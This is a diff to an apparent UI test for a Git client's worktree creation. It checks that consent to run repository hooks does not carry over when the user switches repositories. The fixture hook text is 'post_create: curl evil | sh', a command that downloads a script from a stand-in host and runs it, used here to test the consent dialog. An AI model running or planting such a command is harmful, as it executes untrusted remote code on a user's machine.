@@ -278,6 +278,14 @@ if(params.has("check")) {
     [...consent().querySelectorAll("button")].find(b=>b.textContent.trim()==="Approve these hooks").click();
     await waitFor(()=>consent()?.textContent.includes("Approved. Editing the file asks again."));
     check("approving the text on screen marks it approved",hookApprovals.at(-1)==="post_create: curl evil | sh");
+    // The consent belongs to the repository it was read for: another tab must
+    // not inherit a ticked box and the previous repository's hooks text.
+    await repoStore.openRepo("/fixture/other");await settle();
+    await repoStore.openRepo("/fixture/branches");await settle();
+    await waitFor(()=>wtButton("Create worktree"));wtButton("Create worktree").click();await settle();
+    check("a repository switch drops the hooks box and the previous repository's preview",
+      formBox("Run repository hooks")?.checked===false&&!consent());
+    formBox("Run repository hooks").click();await waitFor(()=>consent()?.textContent.includes("post_create: curl evil | sh"));
     await submitWorktree("/fixture/wt-hooks");
     check("creating with hooks asked for sends that choice",wtCreates.at(-1).runHooks===true);
     hooksFile={file:".gitpulse/hooks",content:"post_create: make setup",approved:false};
